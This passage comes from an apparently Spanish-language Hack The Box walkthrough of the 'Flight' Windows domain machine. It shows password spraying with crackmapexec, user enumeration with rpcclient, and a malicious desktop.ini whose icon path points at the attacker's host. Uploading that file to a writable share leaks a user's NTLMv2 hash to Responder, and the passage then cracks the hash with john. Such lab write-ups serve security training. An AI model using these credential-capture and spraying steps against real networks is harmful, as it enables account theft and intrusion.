+1g 0:00:00:12 DONE <span class="o">(</span>2023-03-15 00:19<span class="o">)</span> 0.08123g/s 866199p/s 866199c/s 866199C/s S@anmeet2k2..S@29<span class="nv">$JL</span>
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+<p>Tenemos credenciales, comprobemos si son válidas con crackmapexec</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
+</code></pre></div></div>
+<p>Son válidas, ya que tenemos credenciales, con rpcclient podemos enumerar a todos los usuarios del dominio</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.187 <span class="nt">-U</span> <span class="s1">'svc_apache%S@Ss!K@*t13'</span> <span class="nt">-c</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[S.Moon] rid:[0x642]
+user:[R.Cold] rid:[0x643]
+user:[G.Lors] rid:[0x644]
+user:[L.Kein] rid:[0x645]
+user:[M.Gold] rid:[0x646]
+user:[C.Bum] rid:[0x647]
+user:[W.Walker] rid:[0x648]
+user:[I.Francis] rid:[0x649]
+user:[D.Truff] rid:[0x64a]
+user:[V.Stevens] rid:[0x64b]
+user:[svc_apache] rid:[0x64c]
+user:[O.Possum] rid:[0x64d]
+</code></pre></div></div>
+<p>Nos reportó 15 usuarios, los copiamos y pegamos en un archivo</p>
+
+<h2 id="archivo-con-los-usuarios">Archivo con los usuarios</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator
+Guest
+krbtgt
+S.Moon
+R.Cold
+G.Lors
+L.Kein
+M.Gold
+C.Bum
+W.Walker
+I.Francis
+D.Truff
+V.Stevens
+svc_apache
+O.Possum
+</code></pre></div></div>
+<p>Con crackmapexec comprebemos si algunos de estos usuarios reutiliza la contraseña de svc_apache</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> usuarios <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">--continue-on-success</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\A</span>dministrator:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\G</span>uest:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\k</span>rbtgt:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\S</span>.Moon:S@Ss!K@<span class="k">*</span>t13                      &lt;<span class="nt">---</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\R</span>.Cold:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\G</span>.Lors:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\L</span>.Kein:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\M</span>.Gold:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\C</span>.Bum:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\W</span>.Walker:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\I</span>.Francis:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\D</span>.Truff:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\V</span>.Stevens:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
+SMB         10.10.11.187    445    G0               <span class="o">[</span>-] flight.htb<span class="se">\O</span>.Possum:S@Ss!K@<span class="k">*</span>t13 STATUS_LOGON_FAILURE 
+</code></pre></div></div>
+<p>El usuario S.Moon reutiliza la contraseña</p>
+
+<p>Con smbmap miremos los permisos del usuario a nivel de recursos compartidos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯  smbmap <span class="nt">-H</span> 10.10.11.187 <span class="nt">-u</span> <span class="s1">'s.moon'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>
+<span class="o">[</span>+] IP: 10.10.11.187:445	Name: flight.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Shared                                            	READ, WRITE	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+	Web                                               	READ ONLY	
+</code></pre></div></div>
+<p>Vemos que Shared tiene capacidad de escritura</p>
+
+<p>Nos conectamos con smbclient</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+❯ smbclient //10.10.11.187/Shared <span class="nt">-U</span> <span class="s1">'s.moon%S@Ss!K@*t13'</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Wed Mar 15 07:31:44 2023
+  ..                                  D        0  Wed Mar 15 07:31:44 2023
+
+		5056511 blocks of size 4096. 1218917 blocks available
+smb: <span class="se">\&gt;</span> 
+
+</code></pre></div></div>
+<p>No vemos nada, ya que tenemos capacidad de escritura intentemos subir un archivo</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whoami</span> <span class="o">&gt;</span> <span class="n">testeo</span><span class="p">.</span><span class="nf">txt</span>
+</code></pre></div></div>
+
+<p>Lo subimos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> put testeo.txt
+NT_STATUS_ACCESS_DENIED opening remote file <span class="se">\t</span>esteo.txt
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+<p>No me dejó &gt;;(, me parece medio raro porque el smbmap nos reportó que tenemos capacidad de escritura, puedo pensar a que se debe por la extensión del archivo, creo que para prevenir archivo .scf, crearemos e intentemos subir un archivo .ini</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whoami</span> <span class="o">&gt;</span> <span class="n">setensa</span><span class="p">.</span><span class="nf">ini</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> put setensa.ini
+putting file setensa.ini as <span class="se">\s</span>etensa.ini <span class="o">(</span>0,0 kb/s<span class="o">)</span> <span class="o">(</span>average 0,0 kb/s<span class="o">)</span>
+smb: <span class="se">\&gt;</span> 
+
+</code></pre></div></div>
+<p>Nos dejó subir el archivo, pero luego de unos minutos se borra, quiero pensar que puede haber alguien por detrás que los esté revisando, probemos subir un archivo .ini malicioso</p>
+
+<h2 id="archivo-ini-malicioso">Archivo .ini malicioso</h2>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">.</span><span class="no">ShellClassInfo</span><span class="p">]</span>
+<span class="no">IconResource</span><span class="o">=</span><span class="p">\\</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="p">\</span><span class="n">ojitoquesetensa</span>
+</code></pre></div></div>
+<p>Antes de subirlo nos ponemos en escucha con el responder</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">responder</span> <span class="o">-</span><span class="no">I</span> <span class="n">tun0</span> <span class="o">-</span><span class="n">w</span> <span class="o">-</span><span class="n">d</span>
+                                         <span class="n">__</span>
+  <span class="p">.</span><span class="nf">-</span><span class="o">---</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">-|</span>  <span class="o">|</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">---.</span>
+  <span class="o">|</span>   <span class="n">_</span><span class="o">|</span>  <span class="o">-</span><span class="n">__</span><span class="o">|</span><span class="n">__</span> <span class="o">--|</span>  <span class="n">_</span>  <span class="o">|</span>  <span class="n">_</span>  <span class="o">|</span>     <span class="o">|</span>  <span class="n">_</span>  <span class="o">||</span>  <span class="o">-</span><span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span>
+  <span class="o">|</span><span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span>   <span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">||</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span>
+                   <span class="o">|</span><span class="n">__</span><span class="o">|</span>
+
+           <span class="no">NBT</span><span class="o">-</span><span class="no">NS</span><span class="p">,</span> <span class="no">LLMNR</span> <span class="o">&amp;</span> <span class="no">MDNS</span> <span class="no">Responder</span> <span class="mf">3.1</span><span class="o">.</span><span class="mf">3.0</span>
+
+  <span class="no">To</span> <span class="n">support</span> <span class="n">this</span> <span class="ss">project:
+  </span><span class="no">Patreon</span> <span class="o">-&gt;</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">patreon</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="no">PythonResponder</span>
+  <span class="no">Paypal</span>  <span class="o">-&gt;</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">paypal</span><span class="p">.</span><span class="nf">me</span><span class="o">/</span><span class="no">PythonResponder</span>
+
+  <span class="no">Author</span><span class="p">:</span> <span class="no">Laurent</span> <span class="no">Gaffie</span> <span class="p">(</span><span class="n">laurent</span><span class="p">.</span><span class="nf">gaffie</span><span class="vi">@gmail</span><span class="p">.</span><span class="nf">com</span><span class="p">)</span>
+  <span class="no">To</span> <span class="n">kill</span> <span class="n">this</span> <span class="n">script</span> <span class="n">hit</span> <span class="no">CTRL</span><span class="o">-</span><span class="no">C</span>
+
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Poisoners</span><span class="p">:</span>
+    <span class="no">LLMNR</span>                      <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">NBT</span><span class="o">-</span><span class="no">NS</span>                     <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">MDNS</span>                       <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DNS</span>                        <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DHCP</span>                       <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Servers</span><span class="p">:</span>
+    <span class="no">HTTP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">HTTPS</span> <span class="n">server</span>               <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">WPAD</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">Auth</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">SMB</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">Kerberos</span> <span class="n">server</span>            <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">SQL</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">FTP</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">IMAP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">POP3</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">SMTP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DNS</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">LDAP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">RDP</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DCE</span><span class="o">-</span><span class="no">RPC</span> <span class="n">server</span>             <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">WinRM</span> <span class="n">server</span>               <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">HTTP</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Always</span> <span class="n">serving</span> <span class="no">EXE</span>         <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Serving</span> <span class="no">EXE</span>                <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Serving</span> <span class="no">HTML</span>               <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Upstream</span> <span class="no">Proxy</span>             <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Poisoning</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Analyze</span> <span class="no">Mode</span>               <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">WPAD</span> <span class="n">auth</span>            <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">Basic</span> <span class="no">Auth</span>           <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">LM</span> <span class="n">downgrade</span>         <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">ESS</span> <span class="n">downgrade</span>        <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Generic</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Responder</span> <span class="no">NIC</span>              <span class="p">[</span><span class="n">tun0</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">IP</span>               <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">IPv6</span>             <span class="p">[</span><span class="n">dead</span><span class="ss">:beef</span><span class="p">:</span><span class="mi">2</span><span class="o">::</span><span class="mi">1014</span><span class="p">]</span>
+    <span class="no">Challenge</span> <span class="n">set</span>              <span class="p">[</span><span class="n">random</span><span class="p">]</span>
+    <span class="no">Don</span><span class="s1">'t Respond To Names     ['</span><span class="no">ISATAP</span><span class="err">'</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Current</span> <span class="no">Session</span> <span class="no">Variables</span><span class="p">:</span>
+    <span class="no">Responder</span> <span class="no">Machine</span> <span class="no">Name</span>     <span class="p">[</span><span class="no">WIN</span><span class="o">-</span><span class="no">TFN5VW4Q55X</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">Domain</span> <span class="no">Name</span>      <span class="p">[</span><span class="mi">0</span><span class="no">LWG</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">DCE</span><span class="o">-</span><span class="no">RPC</span> <span class="no">Port</span>     <span class="p">[</span><span class="mi">47036</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Listening</span> <span class="k">for</span> <span class="n">events</span><span class="o">...</span>
+
+</code></pre></div></div>
+<p>Subamos el archivo malicioso</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> put malicioso.ini
+putting file malicioso.ini as <span class="se">\m</span>alicioso.ini <span class="o">(</span>0,1 kb/s<span class="o">)</span> <span class="o">(</span>average 0,1 kb/s<span class="o">)</span>
+smb: <span class="se">\&gt;</span> 
+</code></pre></div></div>
+<p>Miremos el responder</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">responder</span> <span class="o">-</span><span class="no">I</span> <span class="n">tun0</span> <span class="o">-</span><span class="n">w</span> <span class="o">-</span><span class="n">d</span>
+                                         <span class="n">__</span>
+  <span class="p">.</span><span class="nf">-</span><span class="o">---</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">-|</span>  <span class="o">|</span><span class="p">.</span><span class="nf">-</span><span class="o">----</span><span class="p">.</span><span class="nf">-</span><span class="o">---.</span>
+  <span class="o">|</span>   <span class="n">_</span><span class="o">|</span>  <span class="o">-</span><span class="n">__</span><span class="o">|</span><span class="n">__</span> <span class="o">--|</span>  <span class="n">_</span>  <span class="o">|</span>  <span class="n">_</span>  <span class="o">|</span>     <span class="o">|</span>  <span class="n">_</span>  <span class="o">||</span>  <span class="o">-</span><span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span>
+  <span class="o">|</span><span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span>   <span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">||</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span>
+                   <span class="o">|</span><span class="n">__</span><span class="o">|</span>
+
+           <span class="no">NBT</span><span class="o">-</span><span class="no">NS</span><span class="p">,</span> <span class="no">LLMNR</span> <span class="o">&amp;</span> <span class="no">MDNS</span> <span class="no">Responder</span> <span class="mf">3.1</span><span class="o">.</span><span class="mf">3.0</span>
+
+  <span class="no">To</span> <span class="n">support</span> <span class="n">this</span> <span class="ss">project:
+  </span><span class="no">Patreon</span> <span class="o">-&gt;</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">patreon</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span><span class="no">PythonResponder</span>
+  <span class="no">Paypal</span>  <span class="o">-&gt;</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">paypal</span><span class="p">.</span><span class="nf">me</span><span class="o">/</span><span class="no">PythonResponder</span>
+
+  <span class="no">Author</span><span class="p">:</span> <span class="no">Laurent</span> <span class="no">Gaffie</span> <span class="p">(</span><span class="n">laurent</span><span class="p">.</span><span class="nf">gaffie</span><span class="vi">@gmail</span><span class="p">.</span><span class="nf">com</span><span class="p">)</span>
+  <span class="no">To</span> <span class="n">kill</span> <span class="n">this</span> <span class="n">script</span> <span class="n">hit</span> <span class="no">CTRL</span><span class="o">-</span><span class="no">C</span>
+
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Poisoners</span><span class="p">:</span>
+    <span class="no">LLMNR</span>                      <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">NBT</span><span class="o">-</span><span class="no">NS</span>                     <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">MDNS</span>                       <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DNS</span>                        <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DHCP</span>                       <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Servers</span><span class="p">:</span>
+    <span class="no">HTTP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">HTTPS</span> <span class="n">server</span>               <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">WPAD</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">Auth</span> <span class="n">proxy</span>                 <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">SMB</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">Kerberos</span> <span class="n">server</span>            <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">SQL</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">FTP</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">IMAP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">POP3</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">SMTP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DNS</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">LDAP</span> <span class="n">server</span>                <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">RDP</span> <span class="n">server</span>                 <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">DCE</span><span class="o">-</span><span class="no">RPC</span> <span class="n">server</span>             <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+    <span class="no">WinRM</span> <span class="n">server</span>               <span class="p">[</span><span class="no">ON</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">HTTP</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Always</span> <span class="n">serving</span> <span class="no">EXE</span>         <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Serving</span> <span class="no">EXE</span>                <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Serving</span> <span class="no">HTML</span>               <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Upstream</span> <span class="no">Proxy</span>             <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Poisoning</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Analyze</span> <span class="no">Mode</span>               <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">WPAD</span> <span class="n">auth</span>            <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">Basic</span> <span class="no">Auth</span>           <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">LM</span> <span class="n">downgrade</span>         <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+    <span class="no">Force</span> <span class="no">ESS</span> <span class="n">downgrade</span>        <span class="p">[</span><span class="no">OFF</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Generic</span> <span class="no">Options</span><span class="p">:</span>
+    <span class="no">Responder</span> <span class="no">NIC</span>              <span class="p">[</span><span class="n">tun0</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">IP</span>               <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.105</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">IPv6</span>             <span class="p">[</span><span class="n">dead</span><span class="ss">:beef</span><span class="p">:</span><span class="mi">2</span><span class="o">::</span><span class="mi">1014</span><span class="p">]</span>
+    <span class="no">Challenge</span> <span class="n">set</span>              <span class="p">[</span><span class="n">random</span><span class="p">]</span>
+    <span class="no">Don</span><span class="s1">'t Respond To Names     ['</span><span class="no">ISATAP</span><span class="err">'</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Current</span> <span class="no">Session</span> <span class="no">Variables</span><span class="p">:</span>
+    <span class="no">Responder</span> <span class="no">Machine</span> <span class="no">Name</span>     <span class="p">[</span><span class="no">WIN</span><span class="o">-</span><span class="no">TFN5VW4Q55X</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">Domain</span> <span class="no">Name</span>      <span class="p">[</span><span class="mi">0</span><span class="no">LWG</span><span class="o">.</span><span class="no">LOCAL</span><span class="p">]</span>
+    <span class="no">Responder</span> <span class="no">DCE</span><span class="o">-</span><span class="no">RPC</span> <span class="no">Port</span>     <span class="p">[</span><span class="mi">47036</span><span class="p">]</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Listening</span> <span class="k">for</span> <span class="n">events</span><span class="o">...</span>
+
+<span class="p">[</span><span class="no">SMB</span><span class="p">]</span> <span class="no">NTLMv2</span><span class="o">-</span><span class="no">SSP</span> <span class="no">Client</span>   <span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span>
+<span class="p">[</span><span class="no">SMB</span><span class="p">]</span> <span class="no">NTLMv2</span><span class="o">-</span><span class="no">SSP</span> <span class="no">Username</span> <span class="p">:</span> <span class="n">flight</span><span class="p">.</span><span class="nf">htb</span><span class="p">\</span><span class="n">c</span><span class="p">.</span><span class="nf">bum</span>
+<span class="p">[</span><span class="no">SMB</span><span class="p">]</span> <span class="no">NTLMv2</span><span class="o">-</span><span class="no">SSP</span> <span class="no">Hash</span>     <span class="p">:</span> <span class="n">c</span><span class="p">.</span><span class="nf">bum</span><span class="o">::</span><span class="n">flight</span><span class="p">.</span><span class="nf">htb</span><span class="p">:</span><span class="mi">8</span><span class="n">bc58da2784076a6</span><span class="ss">:A887686F7A31E62187E1B18177A8B660</span><span class="p">:</span><span class="mo">010100000000000000</span><span class="no">A8EBADD756D901C491AD764C783150000000000200080030004C005700470001001E00570049004E002D00540046004E003500560057003400510035003500580004003400570049004E002D00540046004E00350056005700340051003500350058002E0030004C00570047002E004C004F00430041004C000300140030004C00570047002E004C004F00430041004C000500140030004C00570047002E004C004F00430041004C000700080000A8EBADD756D9010600040002000000080030003000000000000000000000000030000055BD617D7D33214E59B58A850B2DDFDF37A55A528650AFED86EC8F736DE5FCB90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320032000000000000000000</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="no">Exiting</span><span class="o">...</span>
+</code></pre></div></div>
+<p>Obtenemos un hash NTLMv2 del usuario c.bum, lo copiamos y pegamos para crackearlo con john</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash2
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
